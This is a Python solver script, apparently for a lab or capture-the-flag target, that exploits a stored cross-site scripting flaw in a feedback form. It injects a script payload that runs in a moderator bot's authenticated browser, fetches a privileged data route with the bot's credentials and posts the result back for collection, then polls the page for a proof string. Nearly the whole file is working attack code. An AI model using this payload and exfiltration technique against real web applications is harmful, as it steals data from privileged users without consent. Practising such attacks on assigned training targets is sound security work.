#!/usr/bin/env python3
"""Stored-XSS solver for the "Feedback Loop" target (day-07 stored-xss family).

Loop (derived from live evidence, see NOTES.md):
  1. GET  /api/clues                     -> moderator_data_route, receipt_route_template
  2. POST /api/messages {"message": XSS} -> {"id": N}   (message field reflected raw)
  3. Moderator bot opens /messages/N (or review page); the payload, running in
     the bot's authenticated browser, fetches moderator_data_route same-origin
     and POSTs it to the receipt route for message N.
  4. GET  /messages/N and read the "Moderator receipt" <pre> for the proof.

Only ever contacts the assigned target origin. Usage:
  python3 solve.py <target_url>
Prints {"proof-1": "<proof>"} on stdout when the receipt is captured.
"""
import json
import re
import sys
import time
import urllib.request
import urllib.error

TIMEOUT = 30
PAUSE = 0.8
POLLS = 12
POLL_WAIT = 6.0


UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")


def req(url, method="GET", data=None, headers=None):
    body = None
    hdrs = {"User-Agent": UA, "Accept": "*/*"}
    hdrs.update(headers or {})
    if data is not None:
        body = json.dumps(data).encode()
        hdrs["Content-Type"] = "application/json"
    r = urllib.request.Request(url, data=body, headers=hdrs, method=method)
    try:
        with urllib.request.urlopen(r, timeout=TIMEOUT) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def build_payload(base, msg_id, data_route, receipt_template):
    receipt = receipt_template.replace("{id}", str(msg_id))
    # Same-origin fetch of the moderator data route as the authenticated bot,
    # then POST the recovered text back to this message's receipt route.
    js = (
        "fetch('%s',{credentials:'include'})"
        ".then(function(r){return r.text()})"
        ".then(function(t){return fetch('%s',{method:'POST',"
        "headers:{'Content-Type':'application/json'},"
        "body:JSON.stringify({evidence:t})})})"
        ".catch(function(e){return fetch('%s',{method:'POST',"
        "headers:{'Content-Type':'application/json'},"
        "body:JSON.stringify({evidence:'ERR:'+String(e)})})});"
        % (data_route, receipt, receipt)
    )
    return "<script>%s</script>" % js


def main():
    base = sys.argv[1].rstrip("/")
    status, clues_raw = req(base + "/api/clues")
    if status != 200:
        print(json.dumps({"error": "clues", "status": status, "body": clues_raw}))
        return 1
    clues = json.loads(clues_raw)
    data_route = clues["moderator_data_route"]
    receipt_template = clues["receipt_route_template"]
    print("clues:", json.dumps(clues), file=sys.stderr)
    time.sleep(PAUSE)

    # First submit a placeholder to learn our message id, then a second
    # message whose payload is tailored to that id. (The payload needs the id;
    # ids are sequential, so we post once to learn the id, then craft.)
    # The submit route is the POST counterpart of clues' feature_route: the
    # receipt template /api/<coll>/{id}/... reveals the collection, and the
    # submit endpoint is /api/<coll> (this variant renamed /messages ->
    # /feedback; /api/messages 405s here).
    coll = re.search(r"/api/([a-z0-9_-]+)/\{id\}", receipt_template).group(1)
    submit_route = "/api/" + coll
    view_route = "/" + coll
    print("submit route: %s, view route: %s" % (submit_route, view_route),
          file=sys.stderr)
    status, first = req(base + submit_route, "POST", {"message": "placeholder"})
    if status not in (200, 201):
        print(json.dumps({"error": "submit", "status": status, "body": first}))
        return 1
    fid = json.loads(first)["id"]
    xss_id = fid + 1
    payload = build_payload(base, xss_id, data_route, receipt_template)
    print("payload for id %d: %s" % (xss_id, payload), file=sys.stderr)
    time.sleep(PAUSE)

    status, second = req(base + submit_route, "POST", {"message": payload})
    if status not in (200, 201):
        print(json.dumps({"error": "submit2", "status": status, "body": second}))
        return 1
    real_id = json.loads(second)["id"]
    if real_id != xss_id:
        # ID guess was wrong; resubmit a payload bound to the true id.
        xss_id = real_id + 1
        payload = build_payload(base, xss_id, data_route, receipt_template)
        time.sleep(PAUSE)
        status, third = req(base + submit_route, "POST", {"message": payload})
        real_id = json.loads(third)["id"]
        if real_id != xss_id:
            print(json.dumps({"error": "id-skew", "id": real_id}))
            return 1
    print("xss message id:", real_id, file=sys.stderr)

    receipt_re = re.compile(
        r"Moderator receipt</strong><pre>(.*?)</pre>", re.S)
    for attempt in range(POLLS):
        time.sleep(POLL_WAIT)
        status, page = req("%s%s/%d" % (base, view_route, real_id))
        if status != 200:
            print("poll %d: status %s" % (attempt, status), file=sys.stderr)
            continue
        m = receipt_re.search(page)
        if m:
            receipt = m.group(1).strip()
            print("receipt captured on poll %d" % attempt, file=sys.stderr)
            # The receipt holds the moderator-route response; the proof is
            # the proof_<hex> string inside it.
            proof = re.search(r"proof_[0-9a-fA-F]+", receipt)
            out = proof.group(0) if proof else receipt
            print(json.dumps({"proof-1": out, "receipt_raw": receipt}))
            return 0
        print("poll %d: no receipt yet" % attempt, file=sys.stderr)
    print(json.dumps({"error": "no-receipt", "id": real_id}))
    return 1


if __name__ == "__main__":
    sys.exit(main() or 0)
